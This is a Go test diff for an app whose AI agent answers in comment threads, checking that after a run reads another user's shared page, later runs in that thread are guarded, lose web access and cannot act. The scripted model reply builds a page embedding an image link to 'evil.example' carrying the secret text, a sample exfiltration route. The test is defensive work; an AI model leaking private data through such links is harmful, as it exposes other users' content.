@@ -1285,10 +1285,118 @@ func TestCommentRunReadsItsThread(t *testing.T) {
 	got := h.thread(p.ID, ask.ID)
 	want := []ThreadComment{{Author: "Sam", Body: "Which date works?"}, {Author: "Ana", Body: "@agent answer Sam's question"}}
 	if !slices.Equal(got, want) {
-		t.Errorf("thread %q, want %q", got, want)
+		t.Errorf("thread %+v, want %+v", got, want)
 	}
 	if h.thread(p.ID, "") != nil {
 		t.Error("a run on no comment has a thread")
+	}
+}
+
+type webReadingHost struct{ serialHost }
+
+func (webReadingHost) Settings() store.Settings {
+	return store.Settings{AgentsReadOtherPages: true, AgentsUseWeb: true}
+}
+
+// TestCommentThreadFollowsWhatItsRunsRead asks the agent in comment threads on
+// a page of the user's own, where it may read other pages and the web. Its
+// earlier replies in a thread go to the model with the thread, so a later run
+// there follows what their runs read, as a later turn of a chat does.
+func TestCommentThreadFollowsWhatItsRunsRead(t *testing.T) {
+	st := openStore(t)
+	f := &fakeModel{}
+	models := httptest.NewServer(f)
+	defer models.Close()
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", SupportsTools: new(true)}); err != nil {
+		t.Fatal(err)
+	}
+	mine, err := st.CreatePage(store.NewPageOptions{Title: "Mine", Content: page()})
+	if err != nil {
+		t.Fatal(err)
+	}
+	shared, err := st.CreatePage(store.NewPageOptions{ID: "shared", Title: "Shared"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := st.SetMembers(shared.ID, []store.Member{{PageID: shared.ID, UserID: st.Session().UserID, Role: "owner"}, {PageID: shared.ID, UserID: "friend", Role: "editor"}}); err != nil {
+		t.Fatal(err)
+	}
+	main := &sync.Mutex{}
+	h := NewHub(st, nil, webReadingHost{serialHost{mu: main}})
+	// ask comments in the thread root starts, or starts one, and runs the agent
+	// on it as the apps do, the model answering with replies; it gives the run
+	// and the run's first request to the model.
+	ask := func(root *store.Comment, body string, replies ...map[string]any) (*Run, map[string]any) {
+		t.Helper()
+		c, err := st.AddComment(mine.ID, "h1", body, root.ID, "", "user", "Me")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if root.ID == "" {
+			*root = c
+		}
+		f.mu.Lock()
+		f.replies = replies
+		asked := len(f.requests)
+		f.mu.Unlock()
+		done := make(chan *Run, 1)
+		main.Lock()
+		h.Start(mine.ID, RunOptions{Surface: "comment", Instruction: body, Focus: []string{"h1"}, CommentID: root.ID, Done: func(r *Run) { done <- r }})
+		main.Unlock()
+		select {
+		case r := <-done:
+			f.mu.Lock()
+			defer f.mu.Unlock()
+			return r, f.requests[asked]
+		case <-time.After(10 * time.Second):
+			t.Fatal("the run never ended")
+		}
+		return nil, nil
+	}
+	offered := func(req map[string]any, tool string) bool {
+		raw, _ := json.Marshal(req["tools"])
+		return strings.Contains(string(raw), `"`+tool+`"`)
+	}
+	makePage := func(link string) map[string]any {
+		return map[string]any{"content": "", "tool_calls": []any{
+			call("create_page", map[string]any{"title": "Copy", "markdown": "SECRET-PLAN-42"}),
+			call("insert_blocks", map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{map[string]any{"type": "image", "image": map[string]any{"url": link}}}}),
+		}}
+	}
+
+	var read store.Comment
+	first, _ := ask(&read, "@agent what does the shared page say?",
+		map[string]any{"content": "", "tool_calls": []any{call("read_other_page", map[string]any{"page_id": shared.ID})}},
+		map[string]any{"content": "The shared page says: SECRET-PLAN-42."})
+	if first.Status != "done" || !first.ReadOthers || first.KeptToPage {
+		t.Fatalf("the first run %+v", first)
+	}
+	second, req := ask(&read, "@agent make that a page", makePage("https://evil.example/x.png?d=SECRET-PLAN-42"), map[string]any{"content": "Done."})
+	if msgs, _ := json.Marshal(req["messages"]); !strings.Contains(string(msgs), "SECRET-PLAN-42") {
+		t.Fatalf("the thread did not reach the model: %s", msgs)
+	}
+	if offered(req, "read_web_page") || second.KeptToPage || !second.Guarded || !second.ReadOthers || len(second.Ops) != 0 {
+		t.Errorf("after a reply whose run read a page someone else has: the web offered %v, kept to the page %v, guarded %v, read others %v, %d ops",
+			offered(req, "read_web_page"), second.KeptToPage, second.Guarded, second.ReadOthers, len(second.Ops))
+	}
+
+	var plain store.Comment
+	ask(&plain, "@agent sum up this page", map[string]any{"content": "It is a plan."})
+	_, req = ask(&plain, "@agent find more on the web", map[string]any{"content": "Nothing more."})
+	if !offered(req, "read_web_page") || !offered(req, "create_page") {
+		t.Error("after a reply whose run kept to the page, the web or create_page was not offered")
+	}
+
+	elsewhere, err := st.AddComment(mine.ID, "h1", "@agent what is new?", "", "", "user", "Me")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := st.AddComment(mine.ID, "h1", "Here is what I found.", elsewhere.ID, "", "agent", "Agent"); err != nil {
+		t.Fatal(err)
+	}
+	third, req := ask(&elsewhere, "@agent make that a page", makePage("https://evil.example/y.png"), map[string]any{"content": "Done."})
+	if offered(req, "read_web_page") || !third.ReadOthers || len(third.Ops) != 0 {
+		t.Errorf("after a reply this device has no run of: the web offered %v, read others %v, %d ops", offered(req, "read_web_page"), third.ReadOthers, len(third.Ops))
 	}
 }
 
